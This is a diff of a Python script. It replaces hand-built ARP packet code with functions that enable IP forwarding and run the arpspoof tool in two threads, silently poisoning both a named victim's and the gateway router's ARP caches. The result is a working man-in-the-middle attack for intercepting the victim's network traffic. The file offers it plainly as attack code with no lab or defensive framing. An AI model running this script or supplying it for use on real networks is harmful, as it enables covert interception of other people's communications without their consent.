@@ -1,95 +1,58 @@
 import subprocess
-import re
-import struct
-import socket
-import platform
-
-def send_arp_reply(target_ip, target_mac, source_ip, source_mac):
-    """Send an ARP reply"""
-
-    iface = "eth0"
-
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-    sock.bind((iface, 0))
-
-    arp_reply = create_arp_reply_header(target_ip, target_mac, source_ip, source_mac)
-    sock.send(arp_reply)
-
-    print(f"ARP reply sent to {target_ip} ({target_mac})")
+import threading
+import os
 
 
-def create_arp_reply_header(target_ip, target_mac, source_ip, source_mac):
-    """Create an ARP reply header"""
-    hardware_type = 1
-    protocol_type = 0x0800
-    hardware_address_length = 6
-    protocol_address_length = 4
-    operation = 2
-
-    arp_reply = struct.pack("!HHBBH6s4s6s4s", hardware_type, protocol_type, 
-                            hardware_address_length, protocol_address_length, operation,
-                            bytes.fromhex(source_mac.replace(":", "")), socket.inet_aton(source_ip),
-                            bytes.fromhex(target_mac.replace(":", "")), socket.inet_aton(target_ip))
-    
-    return arp_reply
+def enable_ip_forwarding():
+    """
+    Enables IP forwarding on Linux by writing to /proc/sys/net/ipv4/ip_forward.
+    """
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        print("[*] IP forwarding enabled.")
+    except PermissionError:
+        print("[!] Permission denied. Run this script with elevated privileges (sudo).")
+    except Exception as e:
+        print(f"[!] Failed to enable IP forwarding: {e}")
 
 
-def get_mac_address(ip=None):
-    mac_pattern = r"([0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2})"
+def perform_arp_spoof(victim_ip, iface="eth0"):
+    enable_ip_forwarding()
+    router_ip = subprocess.check_output(
+        ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
 
-    if not ip:
-        # Local mac address
-        if platform.system().lower() == "windows":
-            try:
-                output = subprocess.check_output(["ipconfig", "/all"], encoding="utf-8", errors="ignore")
-                sections = output.split("\n\n")
-                for section in sections:
-                    if ('Sem fio' in section or 'Wi-Fi' in section) and '*' not in section:
-                        match = re.search(mac_pattern, section)
-                        if match:
-                            return match.group(0).replace('-', ':').upper()
-            except Exception as e:
-                print(f"Error getting MAC address on Windows: {e}")
-        else:
-            try:
-                output = subprocess.check_output(["ifconfig"], encoding="utf-8", errors="ignore")
-                lines = output.splitlines()
-            
-                in_en0 = False
-                for line in lines:
-                    line = line.strip().replace("ether ", "")
-                    if line.startswith("en0:"):
-                        in_en0 = True
-                    elif in_en0:
-                        match = re.search(mac_pattern, line, re.IGNORECASE)
-                        if match:
-                            return match.group(1).upper()
-                        if ":" in line and not line.startswith(" "):
-                            in_en0 = False
-            except Exception as e:
-                print(f"Error getting MAC address on Linux: {e}")
+    victim_thread = threading.Thread(
+        target=run_arpspoof, args=(victim_ip, router_ip, iface, True))
+    router_thread = threading.Thread(
+        target=run_arpspoof, args=(victim_ip, router_ip, iface, False))
 
-    else:
-        # Remote ip mac address
-        output = subprocess.check_output(["arp", "-a"], encoding="utf-8", errors="ignore")
-        lines = output.splitlines()
+    victim_thread.start()
+    router_thread.start()
 
-        if platform.system().lower() == "windows":
-            try:
-                for line in lines:
-                    if ip in line:
-                        match = re.search(mac_pattern, line)
-                        if match:
-                            return match.group(1).replace('-', ':').upper()
-            except Exception as e:
-                print(f"Error getting MAC address for {ip} on Windows: {e}")
-        else:
-            try:
-                ip_pattern = rf"\? \({ip}\)"
-                for line in lines:
-                    if re.search(ip_pattern, line):
-                        match = re.search(mac_pattern, line)
-                        if match:
-                            return match.group(1).upper()
-            except Exception as e:
-                print(f"Error getting MAC address for {ip} on Linux: {e}")
+    victim_thread.join()
+    router_thread.join()
+
+
+def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
+    """
+    Sends unsolicited ARP replies to either the victim or the router.
+    """
+    try:
+        # Redirect output to DEVNULL to make the command silent
+        with open(os.devnull, 'w') as devnull:
+            if target_victim:
+                # Step 1: Send ARP reply to the victim (spoofing the router)
+                print(
+                    f"[*] Sending ARP reply to victim {victim_ip} (pretending to be {router_ip}).")
+                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", victim_ip, router_ip],
+                               stdout=devnull, stderr=devnull, check=True)
+            else:
+                # Step 2: Send ARP reply to the router (spoofing the victim)
+                print(
+                    f"[*] Sending ARP reply to router {router_ip} (pretending to be {victim_ip}).")
+                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", router_ip, victim_ip],
+                               stdout=devnull, stderr=devnull, check=True)
+
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Failed to execute arpspoof: {e}")
